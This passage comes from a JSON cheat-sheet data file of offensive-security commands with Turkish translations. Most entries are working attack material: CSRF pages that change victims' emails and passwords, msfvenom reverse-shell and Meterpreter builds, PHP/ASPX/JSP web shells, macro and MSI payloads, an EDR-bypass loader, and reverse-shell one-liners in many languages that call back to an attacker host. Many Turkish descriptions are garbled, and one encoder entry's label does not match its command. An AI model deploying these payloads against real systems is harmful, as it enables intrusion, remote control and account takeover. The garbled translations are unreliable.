            "cmd": "<html><body onload='document.forms[0].submit()'><form action='http://<TARGET_IP>/admin/change-email' method='POST'><input name='email' value='attacker@evil.com'></form></body></html>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Auto-submit POST form page load üzerinde"
          },
          {
            "title": "CSRF Password Change",
            "desc": "CSRF to change victim password",
            "cmd": "<html><body onload='document.forms[0].submit()'><form action='http://<TARGET_IP>/change-password' method='POST'><input name='new_password' value='hacked123'><input name='confirm_password' value='hacked123'></form></body></html>",
            "tags": [
              "essential"
            ],
            "desc_tr": "CSRF change victim password'e"
          },
          {
            "title": "CSRF via XHR",
            "desc": "CSRF using XMLHttpRequest from XSS",
            "cmd": "<script>var x=new XMLHttpRequest();x.open('POST','http://<TARGET_IP>/admin/adduser');x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.send('user=hacker&pass=hacker&role=admin');</script>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "CSRF XMLHttpRequest XSS kullanarak üzerinden"
          },
          {
            "title": "CSRF via Fetch API",
            "desc": "CSRF using fetch from XSS context",
            "cmd": "<script>fetch('http://<TARGET_IP>/api/update',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})</script>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "CSRF fetch XSS context kullanarak üzerinden"
          },
          {
            "title": "CSRF Token Bypass (Remove)",
            "desc": "Test if CSRF token is actually validated",
            "cmd": "<form action='http://<TARGET_IP>/action' method='POST'><input name='param' value='evil'></form>",
            "tags": [
              "essential"
            ],
            "note": "Omit the CSRF token entirely — some apps don't validate its absence",
            "desc_tr": "Test et: if CSRF token is actually validated"
          },
          {
            "title": "CSRF Token Bypass (Same for All)",
            "desc": "Reuse a previously captured CSRF token",
            "cmd": "<form action='http://<TARGET_IP>/action' method='POST'><input name='csrf' value='<CAPTURED_TOKEN>'><input name='param' value='evil'></form>",
            "tags": [
              "advanced"
            ],
            "note": "Some apps issue tokens but don't tie them to sessions",
            "desc_tr": "Reuse a previously captured CSRF token"
          },
          {
            "title": "CSRF fetch()",
            "desc": "CSRF via fetch API",
            "cmd": "<script>fetch('<URL>/change-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@evil.com'})</script>",
            "tags": [
              "essential"
            ],
            "desc_tr": "CSRF fetch API üzerinden"
          },
          {
            "title": "CSRF Auto-Submit Form",
            "desc": "Auto-submit HTML form",
            "cmd": "<form action='<URL>/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='10000'></form><script>document.forms[0].submit()</script>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Auto-submit HTML form"
          }
        ],
        "name_tr": "CSRF Techniques"
      }
    ],
    "name_tr": "Tarayıcı Tarafı İstismarı",
    "description_tr": "Exploit cross-site scripting, cross-site request forgery, and DOM-based vulnerabilities to attack users and their browsers."
  },
  {
    "id": "payload-craft",
    "name": "Payload Engineering & Delivery",
    "icon": "🖥️",
    "description": "Generate reverse shells, bind shells, web shells, and custom payloads for various platforms using msfvenom and other payload generation tools.",
    "subcategories": [
      {
        "name": "Reverse Shell Payloads (msfvenom)",
        "commands": [
          {
            "title": "Windows Reverse Shell EXE",
            "desc": "Generate Windows reverse shell executable",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Oluştur: Windows ters bağlantı kabuğu executable"
          },
          {
            "title": "Windows Meterpreter EXE",
            "desc": "Generate Windows Meterpreter executable",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter.exe",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Oluştur: Windows Meterpreter executable"
          },
          {
            "title": "Windows Reverse Shell DLL",
            "desc": "Generate Windows reverse shell DLL",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: Windows ters bağlantı kabuğu DLL"
          },
          {
            "title": "Linux Reverse Shell ELF",
            "desc": "Generate Linux reverse shell binary",
            "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Oluştur: Linux ters bağlantı kabuğu binary"
          },
          {
            "title": "Linux Meterpreter ELF",
            "desc": "Generate Linux Meterpreter binary",
            "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o meterpreter.elf",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: Linux Meterpreter binary"
          },
          {
            "title": "PHP Reverse Shell",
            "desc": "Generate PHP reverse shell script",
            "cmd": "msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Oluştur: PHP ters bağlantı kabuğu script"
          },
          {
            "title": "JSP Reverse Shell",
            "desc": "Generate JSP reverse shell",
            "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: JSP ters bağlantı kabuğu"
          },
          {
            "title": "WAR Reverse Shell",
            "desc": "Generate WAR file reverse shell for Tomcat",
            "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Oluştur: WAR file ters bağlantı kabuğu for Tomcat"
          },
          {
            "title": "ASP Reverse Shell",
            "desc": "Generate classic ASP reverse shell",
            "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o shell.asp",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: classic ASP ters bağlantı kabuğu"
          },
          {
            "title": "ASPX Reverse Shell",
            "desc": "Generate ASPX reverse shell",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Oluştur: ASPX ters bağlantı kabuğu"
          },
          {
            "title": "Python Reverse Shell",
            "desc": "Generate Python reverse shell payload",
            "cmd": "msfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: Pythters bağlantı kabuğu payload üzerinde"
          },
          {
            "title": "Bash Reverse Shell",
            "desc": "Generate Bash reverse shell payload",
            "cmd": "msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: Bash ters bağlantı kabuğu payload"
          },
          {
            "title": "PowerShell Reverse Shell",
            "desc": "Generate PowerShell reverse shell payload",
            "cmd": "msfvenom -p cmd/windows/reverse_powershell LHOST=<LHOST> LPORT=<LPORT> -f raw",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: PowerShell ters bağlantı kabuğu payload"
          },
          {
            "title": "msfvenom Windows HTTPS",
            "desc": "Encrypted HTTPS meterpreter",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o shell_https.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "Encrypted HTTPS meterpreter"
          },
          {
            "title": "msfvenom Bind TCP",
            "desc": "Windows bind shell",
            "cmd": "msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=<TARGET_IP> LPORT=<PORT> -f exe -o bind.exe",
            "tags": [
              "tool"
            ],
            "desc_tr": "Windows dinleyen kabuk"
          },
          {
            "title": "msfvenom Bash Shell",
            "desc": "Unix bash reverse",
            "cmd": "msfvenom -p cmd/unix/reverse_bash LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw",
            "tags": [
              "essential"
            ],
            "desc_tr": "Unix bash reverse"
          },
          {
            "title": "msfvenom Python Shell",
            "desc": "Unix python reverse",
            "cmd": "msfvenom -p cmd/unix/reverse_python LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw",
            "tags": [
              "tool"
            ],
            "desc_tr": "Unix pythreverse üzerinde"
          },
          {
            "title": "msfvenom WAR",
            "desc": "WAR for Tomcat",
            "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war -o shell.war",
            "tags": [
              "essential"
            ],
            "desc_tr": "WAR for Tomcat"
          }
        ],
        "name_tr": "Reverse Shell Payloads (msfvenom)"
      },
      {
        "name": "Staged vs Stageless",
        "commands": [
          {
            "title": "Staged Payload (Windows)",
            "desc": "Generate staged payload — smaller, needs handler",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o staged.exe",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Staged: / in payload name (reverse_tcp). Downloads second stage from handler.",
            "desc_tr": "Oluştur: staged payload — smaller, needs handler"
          },
          {
            "title": "Stageless Payload (Windows)",
            "desc": "Generate stageless payload — self-contained",
            "cmd": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o stageless.exe",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Stageless: _ in payload name (reverse_tcp). Contains full payload — larger but more reliable.",
            "desc_tr": "Oluştur: stageless payload — self-contained"
          },
          {
            "title": "Staged Payload (Linux)",
            "desc": "Generate staged Linux payload",
            "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o staged.elf",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: staged Linux payload"
          },
          {
            "title": "Stageless Payload (Linux)",
            "desc": "Generate stageless Linux payload",
            "cmd": "msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o stageless.elf",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: stageless Linux payload"
          },
          {
            "title": "List Available Payloads",
            "desc": "Show all available msfvenom payloads",
            "cmd": "msfvenom --list payloads",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Göster: tüm available msfvenom payloads"
          },
          {
            "title": "List Available Encoders",
            "desc": "Show all available payload encoders",
            "cmd": "msfvenom --list encoders",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: tüm available payload encoders"
          },
          {
            "title": "List Available Formats",
            "desc": "Show all available output formats",
            "cmd": "msfvenom --list formats",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: tüm available output formats"
          },
          {
            "title": "List Payloads",
            "desc": "Show all payloads",
            "cmd": "msfvenom --list payloads | grep <KEYWORD>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: tüm payloads"
          },
          {
            "title": "List Encoders",
            "desc": "Show encoders",
            "cmd": "msfvenom --list encoders",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: encoders"
          },
          {
            "title": "List Formats",
            "desc": "Show output formats",
            "cmd": "msfvenom --list formats",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: output formats"
          }
        ],
        "name_tr": "Staged vs Stageless"
      },
      {
        "name": "Web Shells",
        "commands": [
          {
            "title": "PHP One-Liner Shell",
            "desc": "Minimal PHP web shell",
            "cmd": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
            "tags": [
              "essential"
            ],
            "desc_tr": "Minimal PHP web kabuğu"
          },
          {
            "title": "PHP Passthru Shell",
            "desc": "PHP shell using passthru()",
            "cmd": "echo '<?php passthru($_GET[\"cmd\"]); ?>' > shell.php",
            "tags": [
              "essential"
            ],
            "desc_tr": "PHP shell passthru() kullanarak"
          },
          {
            "title": "PHP Shell_Exec Shell",
            "desc": "PHP shell using shell_exec()",
            "cmd": "echo '<?php echo shell_exec($_GET[\"cmd\"]); ?>' > shell.php",
            "tags": [
              "essential"
            ],
            "desc_tr": "PHP shell shell_exec() kullanarak"
          },
          {
            "title": "PHP Proc_Open Shell",
            "desc": "PHP shell using proc_open()",
            "cmd": "echo '<?php $p=proc_open($_GET[\"cmd\"],[1=>[\"pipe\",\"w\"]],$$ps);echo stream_get_contents($$ps[1]); ?>' > shell.php",
            "tags": [
              "advanced"
            ],
            "desc_tr": "PHP shell proc_open() kullanarak"
          },
          {
            "title": "ASPX Web Shell",
            "desc": "Minimal ASPX web shell",
            "cmd": "echo '<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo{FileName=\"cmd.exe\",Arguments=\"/c \"+Request[\"cmd\"],UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>' > shell.aspx",
            "tags": [
              "essential"
            ],
            "desc_tr": "Minimal ASPX web kabuğu"
          },
          {
            "title": "JSP Web Shell",
            "desc": "Minimal JSP web shell",
            "cmd": "echo '<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>' > shell.jsp",
            "tags": [
              "essential"
            ],
            "desc_tr": "Minimal JSP web kabuğu"
          }
        ],
        "name_tr": "Web Shells"
      },
      {
        "name": "Office & Macro Payloads",
        "commands": [
          {
            "title": "VBA Macro Payload",
            "desc": "Generate VBA macro for Office documents",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f vba -o macro.vba",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: VBA macro for Office documents"
          },
          {
            "title": "HTA PowerShell Payload",
            "desc": "Generate HTA file with PowerShell payload",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hta-psh -o shell.hta",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: HTA file PowerShell payload ile"
          },
          {
            "title": "MSI Installer Payload",
            "desc": "Generate malicious MSI installer",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: malicious MSI installer"
          }
        ],
        "name_tr": "Office & Macro Payloads"
      },
      {
        "name": "Custom Shellcode",
        "commands": [
          {
            "title": "Raw Shellcode (Python)",
            "desc": "Generate shellcode in Python format",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f python -o shellcode.py",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: shellcode Pythformat üzerinde içinde"
          },
          {
            "title": "Raw Shellcode (C)",
            "desc": "Generate shellcode in C format",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -o shellcode.c",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: shellcode C format içinde"
          },
          {
            "title": "Raw Shellcode (C#)",
            "desc": "Generate shellcode in C# format",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f csharp -o shellcode.cs",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: shellcode C# format içinde"
          },
          {
            "title": "Raw Shellcode (Hex)",
            "desc": "Generate shellcode as hex string",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hex",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: shellcode as hex string"
          },
          {
            "title": "Raw Shellcode (Raw)",
            "desc": "Generate raw binary shellcode",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shellcode.bin",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: raw binary shellcode"
          },
          {
            "title": "Encoded Payload (Shikata)",
            "desc": "Encode payload with shikata_ga_nai encoder",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -i 5 -f exe -o encoded.exe",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Kodla: a payload shikata_ga_nai encoder ile"
          },
          {
            "title": "Payload with Bad Chars Excluded",
            "desc": "Generate payload avoiding null bytes and bad characters",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\\x00\\x0a\\x0d' -f exe -o clean.exe",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Oluştur: payload avoiding null bytes and bad characters"
          },
          {
            "title": "x86 Encoded Payload",
            "desc": "Encode x86 payload with shikata_ga_nai",
            "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -o encoded32.exe",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Kodla: a x86 payload shikata_ga_nai ile"
          },
          {
            "title": "Donut PE to Shellcode",
            "desc": "Convert PE to shellcode",
            "cmd": "donut -i payload.exe -o loader.bin",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Dönüştür: PE shellcode'e"
          },
          {
            "title": "ScareCrow Loader",
            "desc": "EDR bypass loader",
            "cmd": "ScareCrow -I shellcode.bin -domain <DOMAIN> -Loader binary",
            "tags": [
              "advanced"
            ],
            "desc_tr": "EDR bypass loader"
          }
        ],
        "name_tr": "Custom Shellcode"
      }
    ],
    "name_tr": "Payload Mühendisliği ve İletimi",
    "description_tr": "Generate reverse shells, bind shells, web shells, and custom payloads for various platforms using msfvenom and other payload generation tools."
  },
  {
    "id": "initial-foothold",
    "name": "Shells, Listeners & Stabilization",
    "icon": "🐚",
    "description": "Establish reverse shells, bind shells, and web shells across platforms, then upgrade to fully interactive TTYs for stable exploitation.",
    "subcategories": [
      {
        "name": "Listener Setup",
        "commands": [
          {
            "title": "Netcat Listener",
            "desc": "Start a basic netcat listener",
            "cmd": "nc -lvnp <LPORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Başlat: a basic netcat listener"
          },
          {
            "title": "Rlwrap Netcat Listener",
            "desc": "Netcat listener with readline (arrow keys)",
            "cmd": "rlwrap nc -lvnp <LPORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Netcat listener readline (arrow keys) ile"
          },
          {
            "title": "Socat Listener",
            "desc": "Start a socat listener",
            "cmd": "socat TCP-LISTEN:<LPORT>,reuseaddr,fork -",
            "tags": [
              "essential"
            ],
            "desc_tr": "Başlat: a socat listener"
          },
          {
            "title": "Socat Encrypted Listener",
            "desc": "Socat listener with SSL encryption",
            "cmds": [
              "openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt",
              "cat shell.key shell.crt > shell.pem",
              "socat OPENSSL-LISTEN:<LPORT>,cert=shell.pem,verify=0,reuseaddr,fork -"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Socat listener SSL encryptiile üzerinde"
          },
          {
            "title": "Metasploit Multi/Handler",
            "desc": "Start MSF multi/handler for staged payloads",
            "cmds": [
              "msfconsole -q",
              "use exploit/multi/handler",
              "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
              "set LHOST <LHOST>",
              "set LPORT <LPORT>",
              "run"
            ],
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Başlat: MSF multi/handler for staged payloads"
          },
          {
            "title": "Metasploit Handler (One-Liner)",
            "desc": "Quick MSF handler start from command line",
            "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run'",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Hızlı MSF handler start command line üzerinden"
          }
        ],
        "name_tr": "Listener Setup"
      },
      {
        "name": "Linux Reverse Shells",
        "commands": [
          {
            "title": "Bash Reverse Shell",
            "desc": "Bash TCP reverse shell",
            "cmd": "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bash TCP ters bağlantı kabuğu"
          },
          {
            "title": "Bash Reverse Shell (Alt)",
            "desc": "Alternative bash reverse shell using file descriptors",
            "cmd": "bash -c 'exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do $line 2>&5 >&5; done'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Alternative bash ters bağlantı kabuğu file descriptors kullanarak"
          },
          {
            "title": "Bash Reverse Shell (exec)",
            "desc": "Bash reverse shell with exec redirection",
            "cmd": "0<&196;exec 196<>/dev/tcp/<LHOST>/<LPORT>; sh <&196 >&196 2>&196",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bash ters bağlantı kabuğu exec redirectiile üzerinde"
          },
          {
            "title": "Python3 Reverse Shell",
            "desc": "Python3 one-liner reverse shell",
            "cmd": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Python3 one-liner ters bağlantı kabuğu"
          },
          {
            "title": "Python2 Reverse Shell",
            "desc": "Python2 one-liner reverse shell",
            "cmd": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Python2 one-liner ters bağlantı kabuğu"
          },
          {
            "title": "PHP Reverse Shell",
            "desc": "PHP one-liner reverse shell",
            "cmd": "php -r '$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "tags": [
              "essential"
            ],
            "desc_tr": "PHP one-liner ters bağlantı kabuğu"
          },
          {
            "title": "Perl Reverse Shell",
            "desc": "Perl one-liner reverse shell",
            "cmd": "perl -e 'use Socket;$i=\"<LHOST>\";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Perl one-liner ters bağlantı kabuğu"
          },
          {
            "title": "Ruby Reverse Shell",
            "desc": "Ruby one-liner reverse shell",
            "cmd": "ruby -rsocket -e'f=TCPSocket.open(\"<LHOST>\",<LPORT>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ruby one-liner ters bağlantı kabuğu"
          },
          {
            "title": "Netcat Reverse Shell (-e)",
            "desc": "Netcat reverse shell with -e option",
            "cmd": "nc -e /bin/sh <LHOST> <LPORT>",
            "tags": [
              "essential"
            ],
            "note": "Only on netcat versions with -e flag (traditional)",
            "desc_tr": "Netcat ters bağlantı kabuğu -e optiile üzerinde"
          },
          {
            "title": "Netcat Reverse Shell (mkfifo)",
            "desc": "Netcat reverse shell without -e flag",
            "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f",
            "tags": [
              "essential"
            ],
            "desc_tr": "Netcat ters bağlantı kabuğu -e flag olmadan"
          },
          {
            "title": "Socat Reverse Shell",
            "desc": "Socat reverse shell",
            "cmd": "socat TCP:<LHOST>:<LPORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "tags": [
              "essential"
            ],
            "desc_tr": "Socat ters bağlantı kabuğu"
          },
          {
            "title": "Socat Encrypted Reverse Shell",
            "desc": "Socat reverse shell over encrypted channel",
            "cmd": "socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Socat ters bağlantı kabuğu over encrypted channel"
          },
          {
            "title": "Lua Reverse Shell",
            "desc": "Lua one-liner reverse shell",
            "cmd": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('<LHOST>','<LPORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Lua one-liner ters bağlantı kabuğu"
          },
          {
            "title": "Awk Reverse Shell",
            "desc": "AWK reverse shell one-liner",
            "cmd": "awk 'BEGIN {s = \"/inet/tcp/0/<LHOST>/<LPORT>\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
            "tags": [
              "advanced"
            ],
            "desc_tr": "AWK ters bağlantı kabuğu one-liner"
          },
          {
            "title": "Groovy Reverse Shell",
            "desc": "Groovy reverse shell for Jenkins Script Console",
            "cmd": "String host='<LHOST>';int port=<LPORT>;String cmd='/bin/bash';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break}catch(Exception e){}};p.destroy();s.close()",
            "tags": [
              "advanced"
            ],
            "note": "Use in Jenkins Groovy Script Console",
            "desc_tr": "Groovy ters bağlantı kabuğu for Jenkins Script Console"
          },
          {
            "title": "Node.js Reverse Shell",
            "desc": "Node.js one-liner reverse shell",
            "cmd": "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/bash\",[]);var client=new net.Socket();client.connect(<LPORT>,\"<LHOST>\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})()'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Node.js one-liner ters bağlantı kabuğu"
          },
          {
            "title": "Golang Reverse Shell",
            "desc": "Go language reverse shell (compile on attacker)",
            "cmd": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"<LHOST>:<LPORT>\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go build -o /tmp/rs /tmp/rs.go && /tmp/rs",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Go language ters bağlantı kabuğu (compile attacker) üzerinde"
          },
          {
            "title": "Telnet Reverse Shell",
            "desc": "Reverse shell using telnet",
            "cmd": "TF=$(mktemp -u);mkfifo $TF && telnet <LHOST> <LPORT> 0<$TF | /bin/sh 1>$TF",
            "tags": [
              "essential"
            ],
            "desc_tr": "ters bağlantı kabuğu telnet kullanarak"
          },
          {
            "title": "OpenSSL Reverse Shell",
            "desc": "Encrypted reverse shell via OpenSSL",
            "cmds": [
              "# On attacker: openssl s_server -quiet -key key.pem -cert cert.pem -port <LPORT>",
              "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <LHOST>:<LPORT> > /tmp/s; rm /tmp/s"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Encrypted ters bağlantı kabuğu OpenSSL üzerinden"
          },
          {
            "title": "Busybox NC Shell",
            "desc": "Busybox netcat shell",
            "cmd": "busybox nc <ATTACKER_IP> <PORT> -e /bin/sh",
            "tags": [
              "tool"
            ],
            "desc_tr": "Busybox netcat shell"
          },
          {
            "title": "Groovy Shell (Jenkins)",
            "desc": "Shell for Jenkins console",
            "cmd": "String h=\"<ATTACKER_IP>\";int p=<PORT>;String c=\"/bin/bash\";Process pr=new ProcessBuilder(c).redirectErrorStream(true).start();Socket s=new Socket(h,p);InputStream pi=pr.getInputStream(),pe=pr.getErrorStream(),si=s.getInputStream();OutputStream po=pr.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);}",
            "tags": [
              "tool"
            ],
            "desc_tr": "Shell for Jenkins console"
          }
        ],
        "name_tr": "Linux Reverse Shells"
      },
      {
        "name": "Windows Reverse Shells",
        "commands": [
          {
            "title": "PowerShell Reverse Shell (One-Liner)",
            "desc": "PowerShell TCP reverse shell one-liner",
            "cmd": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "PowerShell TCP ters bağlantı kabuğu one-liner"
          },
          {
            "title": "PowerShell Base64 Reverse Shell",
            "desc": "Base64-encoded PowerShell reverse shell",
            "cmds": [
